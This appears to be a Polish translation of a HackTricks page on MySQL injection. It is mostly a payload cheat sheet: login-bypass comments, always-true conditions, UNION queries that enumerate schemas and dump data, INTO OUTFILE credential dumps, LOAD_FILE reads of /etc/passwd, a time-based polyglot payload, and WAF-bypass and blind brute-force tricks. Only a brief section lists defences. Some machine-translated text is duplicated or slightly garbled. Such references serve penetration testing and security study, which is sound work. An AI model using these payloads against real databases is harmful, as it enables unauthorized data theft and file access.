# Wstrzykiwanie MySQL

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy, jak Twoja **firma jest reklamowana w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najwa偶niejsze wydarzenie zwizane z cyberbezpieczestwem w **Hiszpanii** i jedno z najwa偶niejszych w **Europie**. Majc na celu promowanie wiedzy technicznej, ten kongres jest gorcym punktem spotka dla profesjonalist贸w technologii i cyberbezpieczestwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## Komentarze
```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```
## Interesujce funkcje

### Potwierdzenie Mysql:
```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```
### Przydatne funkcje

The following functions can be useful when performing MySQL injection attacks:

Nastpujce funkcje mog by przydatne podczas przeprowadzania atak贸w SQL Injection na bazie danych MySQL:

- `version()`: Returns the version of the MySQL server.
- `database()`: Returns the name of the current database.
- `user()`: Returns the username used to connect to the MySQL server.
- `current_user()`: Returns the current user.
- `schema()`: Returns the name of the current schema.
- `@@hostname`: Returns the hostname of the MySQL server.
- `@@datadir`: Returns the data directory of the MySQL server.
- `@@basedir`: Returns the base directory of the MySQL server.
- `@@version_compile_os`: Returns the operating system on which the MySQL server was compiled.
- `@@version`: Returns the version of the MySQL server.
- `@@global.version_compile_os`: Returns the operating system on which the MySQL server was compiled.
- `@@global.version`: Returns the version of the MySQL server.

These functions can provide valuable information about the MySQL server, which can be used to further exploit vulnerabilities or gather intelligence during a penetration test.

Te funkcje mog dostarczy cenne informacje na temat serwera MySQL, kt贸re mog by wykorzystane do dalszego wykorzystania podatnoci lub zbierania informacji podczas testu penetracyjnego.
```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```
## Wszystkie wstrzyknicia

Wstrzyknicie SQL to technika ataku, kt贸ra polega na wstrzykniciu zoliwego kodu SQL do zapytania SQL, kt贸re jest wykonywane przez aplikacj internetow. Wstrzyknicie SQL mo偶e prowadzi do powa偶nych konsekwencji, takich jak odczyt, modyfikacja lub usunicie danych w bazie danych.

W przypadku wstrzyknicia SQL w MySQL, atakujcy mo偶e wykorzysta r贸偶ne techniki, aby osign cel. Poni偶ej przedstawiono kilka popularnych technik wstrzyknicia SQL w MySQL:

### 1. Wstrzyknicie komentarza

Wstrzyknicie komentarza to technika, kt贸ra polega na wstrzykniciu komentarza SQL do zapytania, aby wyczy reszt kodu. Przykad:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password'
```

W powy偶szym przykadzie, komentarz `--` wycza reszt kodu, co pozwala na zalogowanie si jako administrator bez znajomoci hasa.

### 2. Wstrzyknicie warunku zawsze prawdziwego

Wstrzyknicie warunku zawsze prawdziwego to technika, kt贸ra polega na wstrzykniciu warunku, kt贸ry zawsze jest prawdziwy, aby obej autoryzacj. Przykad:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'password'
```

W powy偶szym przykadzie, warunek `'1'='1'` zawsze jest prawdziwy, co umo偶liwia zalogowanie si jako administrator bez znajomoci hasa.

### 3. Wstrzyknicie zapytania UNION

Wstrzyknicie zapytania UNION to technika, kt贸ra polega na wstrzykniciu zapytania UNION do zapytania SQL, aby poczy wyniki dw贸ch zapyta. Przykad:

```sql
SELECT username, password FROM users WHERE username = 'admin' UNION SELECT table_name, column_name FROM information_schema.columns'
```

W powy偶szym przykadzie, wstrzyknicie zapytania UNION pozwala na wywietlenie nazw tabel i kolumn w bazie danych.

### 4. Wstrzyknicie zapytania SELECT INTO OUTFILE

Wstrzyknicie zapytania SELECT INTO OUTFILE to technika, kt贸ra polega na wstrzykniciu zapytania SELECT INTO OUTFILE do zapytania SQL, aby zapisywa wyniki zapytania do pliku na serwerze. Przykad:

```sql
SELECT username, password INTO OUTFILE '/var/www/html/leak.txt' FROM users WHERE username = 'admin'
```

W powy偶szym przykadzie, wstrzyknicie zapytania SELECT INTO OUTFILE powoduje zapisanie nazw u偶ytkownik贸w i hase do pliku "leak.txt" na serwerze.

### 5. Wstrzyknicie zapytania LOAD_FILE

Wstrzyknicie zapytania LOAD_FILE to technika, kt贸ra polega na wstrzykniciu zapytania LOAD_FILE do zapytania SQL, aby odczytywa zawarto plik贸w na serwerze. Przykad:

```sql
SELECT LOAD_FILE('/etc/passwd')
```

W powy偶szym przykadzie, wstrzyknicie zapytania LOAD_FILE powoduje odczytanie zawartoci pliku "/etc/passwd" na serwerze.

### 6. Inne techniki

Opr贸cz powy偶szych technik, istnieje wiele innych technik wstrzyknicia SQL w MySQL, takich jak wstrzyknicie kodu SQL do parametr贸w zapytania, wstrzyknicie kodu SQL do nazw tabeli itp. Wa偶ne jest, aby zrozumie r贸偶ne techniki wstrzyknicia SQL i wiedzie, jak si przed nimi broni.
```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```
z [https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)

## Przebieg

Pamitaj, 偶e w "nowoczesnych" wersjach **MySQL** mo偶na zastpi "_**information\_schema.tables**_" przez "_**mysql.innodb\_table\_stats**_**"** (Mo偶e to by przydatne do obejcia WAF-贸w).
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```
### **Tylko 1 warto**

* `group_concat()`
* `Limit X,1`

### **lepe, po jednym**

* `substr(version(),X,1)='r'` lub `substring(version(),X,1)=0x70` lub `ascii(substr(version(),X,1))=112`
* `mid(version(),X,1)='5'`

### **lepe, dodawanie**

* `LPAD(version(),1...lenght(version()),'1')='asd'...`
* `RPAD(version(),1...lenght(version()),'1')='asd'...`
* `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
* `SELECT LEFT(version(),1...lenght(version()))='asd'...`
* `SELECT INSTR('foobarbar', 'fo...')=1`

## Wykrywanie liczby kolumn

U偶ywajc prostego ORDER
```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```
## MySQL Union Based

MySQL Union Based (Unia oparta na MySQL) jest jedn z najpopularniejszych technik ataku SQL Injection. Ta technika polega na wykorzystaniu operatora UNION w celu czenia wynik贸w dw贸ch lub wicej zapyta SQL w jednym wyniku. Dziki temu atakujcy mo偶e uzyska dostp do danych, do kt贸rych normalnie nie miaby uprawnie.

### Krok po kroku

1. Zidentyfikuj podatny parametr: Pierwszym krokiem jest zidentyfikowanie parametru, kt贸ry jest podatny na atak SQL Injection. Mo偶e to by np. pole formularza lub parametr URL.

2. Sprawd藕, czy parametr jest podatny: Aby sprawdzi, czy parametr jest podatny na atak SQL Injection, mo偶esz doda znak jednostrzaki (') lub podw贸jnego minusa (--) na kocu wartoci parametru. Jeli otrzymasz bd lub zmieni si wygld strony, to oznacza, 偶e parametr jest podatny.

3. Znajd藕 liczb kolumn: Aby przeprowadzi atak Union Based, musisz zna liczb kolumn w tabeli, z kt贸rej chcesz wydoby dane. Mo偶esz to zrobi, dodajc kolejno UNION SELECT NULL, NULL, ..., NULL, NULL do zapytania, a偶 przestaniesz otrzymywa bdy. Liczba NULL-贸w odpowiada liczbie kolumn.

4. Wydobywanie danych: Po znalezieniu liczby kolumn mo偶esz rozpocz wydobywanie danych. Mo偶esz to zrobi, dodajc UNION SELECT z odpowiednimi kolumnami i tabel, z kt贸rej chcesz pobra dane. Na przykad, UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM tabela.

5. Dodatkowe informacje: Jeli chcesz uzyska wicej informacji o strukturze bazy danych, mo偶esz u偶y funkcji UNION SELECT zamiast UNION SELECT. Na przykad, UNION SELECT table_name, column_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_schema=database().

### Zabezpieczenia

Aby zabezpieczy aplikacj przed atakami SQL Injection, nale偶y stosowa odpowiednie techniki sanitacji danych wejciowych, takie jak:

- U偶ywanie parametryzowanych zapyta SQL.
- Walidacja i filtrowanie danych wejciowych.
- Unikanie dynamicznych zapyta SQL.
- Ograniczanie uprawnie u偶ytkownik贸w bazy danych.

Pamitaj, 偶e zabezpieczenia te powinny by stosowane na wszystkich warstwach aplikacji, wczajc frontend, backend i baz danych.
```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```
## SSRF

**Dowiedz si tutaj, jak wykorzysta wstrzyknicie MySQL do uzyskania SSRF** [**tutaj**](mysql-ssrf.md)**.**

## Triki na omijanie WAF

### Alternatywy dla information\_schema

Pamitaj, 偶e w "nowoczesnych" wersjach **MySQL** mo偶esz zastpi _**information\_schema.tables**_ przez _**mysql.innodb\_table\_stats**_ lub przez _**sys.x$schema\_flattened\_keys**_ lub przez **sys.schema\_table\_statistics**

### Wstrzyknicie MySQL bez przecink贸w

Wybierz 2 kolumny bez u偶ycia przecink贸w ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):
```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```
### Pobieranie wartoci bez nazwy kolumny

Jeli w pewnym momencie znasz nazw tabeli, ale nie znasz nazw kolumn wewntrz tabeli, mo偶esz spr贸bowa znale藕 liczb kolumn, wykonujc co takiego jak:
```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```
Zakadajc, 偶e istniej 2 kolumny (pierwsza to ID), a druga to flaga, mo偶esz spr贸bowa bruteforce'owa zawarto flagi, pr贸bujc znak po znaku:
```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```
Wicej informacji na [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)

### Historia MySQL

Mo偶esz zobaczy inne wykonania wewntrz MySQL, czytajc tabel: **sys.x$statement\_analysis**

### Alternatywne wersje
```
mysql> select @@innodb_version;
mysql> select @@version;
mysql> select version();
```
## Inne przewodniki dotyczce wstrzykiwania MYSQL

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)]

## Odwoania
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)


<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najwa偶niejsze wydarzenie zwizane z cyberbezpieczestwem w **Hiszpanii** i jedno z najwa偶niejszych w **Europie**. Majc na celu promowanie wiedzy technicznej, ten kongres jest gorcym punktem spotka dla profesjonalist贸w technologii i cyberbezpieczestwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy, jak Twoja **firma jest reklamowana w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
